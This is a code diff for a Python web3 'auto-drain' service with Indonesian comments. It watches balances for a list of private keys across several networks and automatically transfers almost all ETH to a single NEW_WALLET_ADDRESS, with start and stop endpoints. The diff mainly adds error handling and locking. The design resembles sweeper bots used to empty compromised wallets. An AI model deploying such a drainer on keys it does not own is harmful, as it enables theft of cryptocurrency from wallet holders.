@@ -54,14 +54,20 @@ wallets = []
 for private_key in PRIVATE_KEYS:
     for network_name, rpc_url in NETWORKS.items():
         if rpc_url:
-            w3 = Web3(Web3.HTTPProvider(rpc_url))
-            account = w3.eth.account.from_key(private_key)
-            wallets.append({
-                "network": network_name,
-                "web3": w3,
-                "address": account.address,
-                "private_key": private_key
-            })
+            try:
+                w3 = Web3(Web3.HTTPProvider(rpc_url))
+                if not w3.is_connected():
+                    print(f"Failed to connect to {network_name} RPC: {rpc_url}")
+                    continue
+                account = w3.eth.account.from_key(private_key)
+                wallets.append({
+                    "network": network_name,
+                    "web3": w3,
+                    "address": account.address,
+                    "private_key": private_key
+                })
+            except Exception as e:
+                print(f"Error connecting to {network_name} RPC: {e}")
         else:
             print(f"RPC untuk {network_name} tidak ditemukan, melewati...")
 
@@ -77,31 +83,25 @@ def transfer_eth(w3, network_name, from_address, private_key):
     balance = get_eth_balance(w3, from_address)
     if balance > 0.0005:
         nonce = w3.eth.get_transaction_count(from_address)
+        to_address = Web3.to_checksum_address(NEW_WALLET_ADDRESS)
 
-# Pastikan NEW_WALLET_ADDRESS valid dan dalam format checksum
-from_address = account.address
-to_address = Web3.to_checksum_address(NEW_WALLET_ADDRESS)
-balance = w3.eth.get_balance(from_address)
+        try:
+            tx = {
+                "to": to_address,
+                "value": w3.to_wei(balance - Decimal("0.0005"), "ether"),
+                "gas": 21000,
+                "gasPrice": w3.eth.gas_price,
+                "nonce": nonce,
+                "chainId": w3.eth.chain_id,
+            }
 
-# Kirim ke NEW_WALLET_ADDRESS
-try:
-    tx = {
-        "to": to_address,
-        "value": w3.to_wei(balance - Decimal("0.0005"), "ether"),
-        "gas": 21000,
-        "gasPrice": w3.eth.gas_price,
-        "nonce": w3.eth.get_transaction_count(from_address),
-        "chainId": w3.eth.chain_id,
-    }
-
-    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
-    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
-    print(f"[{network_name}] ETH dari {from_address} dikirim! TX Hash: {w3.to_hex(tx_hash)}")
-
-
-except Exception as e:
-    # Tangani error transaksi dan coba ulang
-    print(f"Error during transaction: {e}")
+            signed_tx = w3.eth.account.sign_transaction(tx, private_key)
+            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+            print(f"[{network_name}] ETH dari {from_address} dikirim! TX Hash: {w3.to_hex(tx_hash)}")
+        except ValueError as e:
+            print(f"Invalid transaction parameters: {e}")
+        except Exception as e:
+            print(f"Unexpected error during transaction: {e}")
 
 # Fungsi monitoring semua wallet di semua jaringan
 def monitor_wallets():
@@ -125,22 +125,24 @@ def monitor_wallets():
 @app.post("/start-drain")
 def start_drain():
     global drain_running
-    if not drain_running:
-        drain_running = True
-        threading.Thread(target=monitor_wallets).start()
-        return {"status": "Auto-drain dimulai untuk semua wallet di semua jaringan!"}
-    else:
-        return {"status": "Auto-drain sudah berjalan!"}
+    with drain_lock:
+        if not drain_running:
+            drain_running = True
+            threading.Thread(target=monitor_wallets).start()
+            return {"status": "Auto-drain dimulai untuk semua wallet di semua jaringan!"}
+        else:
+            return {"status": "Auto-drain sudah berjalan!"}
 
 # Endpoint API untuk menghentikan auto-drain
 @app.post("/stop-drain")
 def stop_drain():
     global drain_running
-    if drain_running:
-        drain_running = False
-        return {"status": "Auto-drain dihentikan untuk semua wallet!"}
-    else:
-        return {"status": "Auto-drain tidak berjalan!"}
+    with drain_lock:
+        if drain_running:
+            drain_running = False
+            return {"status": "Auto-drain dihentikan untuk semua wallet!"}
+        else:
+            return {"status": "Auto-drain tidak berjalan!"}
 
 # Cek status monitoring
 @app.get("/status")
